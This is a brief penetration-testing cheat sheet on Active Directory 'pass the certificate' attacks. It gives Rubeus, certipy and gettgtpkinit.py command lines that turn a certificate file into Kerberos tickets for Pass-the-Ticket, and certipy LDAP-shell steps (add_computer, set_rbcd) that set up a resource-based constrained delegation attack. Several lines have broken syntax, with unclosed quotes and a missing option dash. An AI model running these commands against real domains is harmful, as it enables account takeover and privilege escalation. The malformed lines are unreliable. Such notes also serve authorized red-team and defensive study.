# Pass the Certificate

## Tools: gettgtpkinit.py , Rubeus , certipy

# PKINIT

#### 1) Rubeus

 - Rubeus.exe asktgt /user:"USERNAME" /certificate:"PFX_FILE" [/password:"CERTIFICATE_PASSWORD] /domain:"FQDN_DOMAIN" /dc:"DC" /show

#### 2) certipy

 - certipy auth -pfx CRT_FILE -dc-ip DC_IP

#### 3) gettgtpkinit.py

 - gettgtpkinit.py -cert-pfx "PFX_FILE" [cert-pfx-pass "CERT_PASSWORD"] "FQDN_DOMAIN/USER "TGT_CCACHE_FILE"

### These 3 techniques can be performed for a Pass-the-Ticket attack

# Schannel

#### 1) certipy

 - certipy auth -pfx CRT_FILE -ldap-shell

 - add_computer

 - set_rbcd

### With this technique, we can now perform an RBCD attack
